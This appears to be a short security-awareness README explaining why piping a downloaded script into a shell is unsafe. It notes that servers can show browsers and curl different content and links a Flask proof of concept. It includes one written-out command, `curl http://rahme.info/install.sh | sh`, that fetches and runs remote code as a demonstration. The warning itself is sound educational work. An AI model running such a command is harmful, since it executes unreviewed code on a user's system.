Why you shouldn't run arbitrary code over the network
=====================================================

It is not enough to inspect the file before running this horrible command. Try
this:

* Read the file located at http://rahme.info/install.sh
* Execute `curl http://rahme.info/install.sh | sh`


What happened?
--------------

It's not very difficult to configure your webserver to server different content
based on the client of the users. I wrote a [very basic proof of concept][1] in
Flask.

What should I do?
-----------------
Download the file locally. Read it. Run it maybe.



I also want to mention [this website][2] that catalogs all the projects that
promote this practice in their installation instructions.

[1]: https://github.com/joehakimrahme/curlsh/blob/master/curlsh.py#L20
[2]: http://curlpipesh.tumblr.com/

